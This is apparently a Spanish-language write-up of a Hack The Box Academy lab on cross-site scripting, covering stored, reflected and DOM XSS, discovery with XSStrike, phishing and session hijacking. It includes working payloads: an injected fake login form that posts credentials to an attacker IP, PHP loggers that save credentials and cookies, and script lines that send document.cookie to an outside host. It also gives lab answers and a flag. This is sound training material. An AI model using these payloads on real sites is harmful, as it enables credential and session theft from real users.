# Cross-Site-Scripting (XSS)

{% file src="../.gitbook/assets/Cross_Site_Scripting_Xss_Module_Cheat_Sheet.pdf" %}

## Básicos XSS

#### Tipos de XSS

Hay tres tipos principales de vulnerabilidades XSS:

| Tipo                             | Descripción                                                                                                                                                                                                                                                                                |
| -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `Stored (Persistent) XSS`        | El tipo más crítico de XSS, que ocurre cuando la entrada del usuario se almacena en la base de datos de back-end y luego se muestra en recuperación (por ejemplo, publicaciones o comentarios)                                                                                             |
| `Reflected (Non-Persistent) XSS` | Ocurre cuando la entrada del usuario se muestra en la página después de ser procesada por el servidor de backend, pero sin ser almacenado (por ejemplo, resultado de búsqueda o mensaje de error)                                                                                          |
| `DOM-based XSS`                  | Otro tipo XSS no persistente que ocurre cuando la entrada del usuario se muestra directamente en el navegador y se procesa completamente en el lado del cliente, sin llegar al servidor de back-end (por ejemplo, a través de parámetros HTTP del lado del cliente o etiquetas de anclaje) |

### Stored XSS

#### XSS Testing Payloads

```
<script>alert(window.origin)</script>
```

{% hint style="warning" %}
Muchas aplicaciones web modernas utilizan iFrames entre dominios para manejar la entrada del usuario, de modo que incluso si el formulario web es vulnerable a XSS, no sería una vulnerabilidad en la aplicación web principal. Por eso mostramos el valor de window.originen la caja de alerta, en lugar de un valor estático como 1. En este caso, el cuadro de alerta revelaría la URL en la que se está ejecutando, y confirmará qué forma es vulnerable, en caso de que se estuviera utilizando un iFrame.
{% endhint %}

#### Preguntas

**To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**

```
<script>alert(document.cookie)</script>
```

<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Reflected XSS

#### Preguntas

To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.

```
<script>alert(document.cookie)</script>
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

### Dom XSS

* document.write()
* DOM.innerHTML
* DOM.outerHTML
* add()
* after()
* append()

```
<img src="" onerror=alert(window.origin)>
```

#### Preguntas

**To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**

Al leer el código fuente, ver que había un `eval(atob(...))`, decodificar el base64 que contenía y descubrir que ahí estaba asignada la cookie con el flag `HTB{pur3ly_cl13n7_51d3}`.

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### XSS Discovery

#### Automated Discovery

```
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```

{% @github-files/github-code-block url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master" %}

{% @github-files/github-code-block url="https://github.com/payloadbox/" %}

#### Preguntas

**Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?**

Nos registramos para ver como es la petición.

```
python3 xsstrike.py -u "http://94.237.60.55:52450/?fullname=test&username=test&password=test&email=test@test.com"
```

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**What type of XSS was found on the above server? "name only"**

Reflected

## XSS Attacks

Cuatro elementos HTML se utilizan generalmente para cambiar el aspecto principal de una página web:

* Color de fondo `document.body.style.background`
* Antecedentes `document.body.background`
* Título de la página `document.title`
* Texto de la página `DOM.innerHTML`

```
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
<script>document.title = 'HackTheBox Academy'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

### Phishing

#### Preguntas

**Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.**

Creamos la URL maliciosa.

```
document.write('<h3>Please login to continue</h3><form action=http://10.10.15.62><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

URL creada:

[http://10.129.234.166/phishing/index.php?url=document.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.15.62%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3B](http://10.129.234.166/phishing/index.php?url=document.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.15.121%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3B)

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

Creamos un directorio temporal para crear nuestro servidor ya que el cliente ya lo tenemos.

```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.234.166/phishing/login.php");
    fclose($file);
    exit();
}
?>
```

```
mkdir /tmp/tmpserver
cd /tmp/tmpserver
touch index.php 
sudo php -S 0.0.0.0:80
```

Pegamos la URL anterior creada y al enviar tenemos las credenciales.

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con esas credenciales.

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Session Hijacking

```
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

#### Preguntas

**Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.**

Rellenamos los campos y nos damos cuenta qué campo es vulnerable.

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora creamos un script junto con servidor **php** para conectarnos de manera remota.

<pre><code><strong>&#x3C;?php
</strong>if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
</code></pre>

```
document.location='http://10.10.15.62/index.php?c='+document.cookie;
new Image().src='http://10.10.15.62/index.php?c='+document.cookie;
```

Teniendo ya esto volvemos a rellenar los campos pero cambiando el payload.

```
"><script src=http://10.10.15.62/script.js></script>
```

<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Con este script nos conectamos.

```
import requests

url = "http://10.129.234.166/hijacking/login.php"  
cookies = {"cookie": "c00k1355h0u1d8353cu23d"}    

r = requests.get(url, cookies=cookies, timeout=10)
print(r.status_code)
print(r.text[:500])
```

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Skills Assessment

#### Preguntas

**What is the value of the 'flag' cookie?**

En la página inicial identifiqué un campo de búsqueda y un enlace “Welcome to Security Blog” que lleva a una zona de comentarios con varios inputs. Levanté un servidor PHP como antes y probé un payload simple en cada campo para detectar cuál era vulnerable.

El campo **website** es vulnerable.

<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

Insertamos ese payload en el campo website.

```
'><script src=http://10.10.15.62/script.js></script>
```

<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
